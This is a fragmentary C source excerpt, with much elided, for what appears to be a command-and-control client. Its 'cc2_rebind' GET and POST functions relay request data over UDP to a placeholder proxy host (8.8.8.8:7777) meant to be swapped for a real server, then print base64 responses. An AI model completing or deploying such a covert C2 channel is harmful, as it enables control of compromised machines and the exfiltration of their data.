...
int sendUDP(char *hostIP, int port, int msgType, char *request, int request_len, char **response, int *response_len) {
    *response_len = 0;
    ...
    sendto(sockfd, msgHeader, strlen(msgHeader), 0,(struct sockaddr *)&servaddr, sizeof(servaddr));
    printf("send msgBody\n");
...
void cc2_rebind_get_protocol(char *reqData, char **outputData, long long *outputData_len) {
    ...
    sendUDP("8.8.8.8", 7777, 1, reqData, strlen(reqData), outputData, outputData_len);
    if (*outputData_len > 0) {
...
void cc2_rebind_post_protocol(char *reqData, char *id, char **outputData, long long *outputData_len) {
    ...
    // 8.8.8.8 replaced with the real proxy_server ip
    sendUDP("8.8.8.8", 7777, 2, rawData, strlen(rawData), outputData, outputData_len);
    if (*outputData_len > 0) {
        printf("http response(%d): \n", *outputData_len);
        printf("-----end-----\n");
        printf("\nb64 response: %s\n", *outputData);
